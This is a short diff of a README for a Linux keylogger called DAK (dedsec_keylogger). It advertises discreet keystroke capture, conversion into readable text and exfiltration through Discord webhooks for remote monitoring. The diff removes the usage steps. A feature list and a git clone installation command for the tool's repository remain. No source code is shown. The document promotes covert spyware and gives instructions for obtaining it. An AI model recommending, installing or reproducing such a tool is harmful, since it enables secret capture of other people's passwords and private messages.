@@ -27,10 +27,7 @@ DAK is a Linux-based tool designed for discreetly capturing keystrokes, providin
   * Discord Webhook Integration: Utilizes Discord webhooks to send captured data, enabling remote monitoring.
   
   * Keystroke Conversion: Converts captured keystrokes into a human-readable format, resembling what the user sees on the screen, enhancing readability and comprehension of captured data.
-    
-### Usage:
-   * Run the dedsec_keylogger tool from the terminal.
-   * setup your webhook link.
+
 
 ### INSTALLATION
     * git clone https://github.com/0xbitx/DEDSEC_KEYLOGGER.git
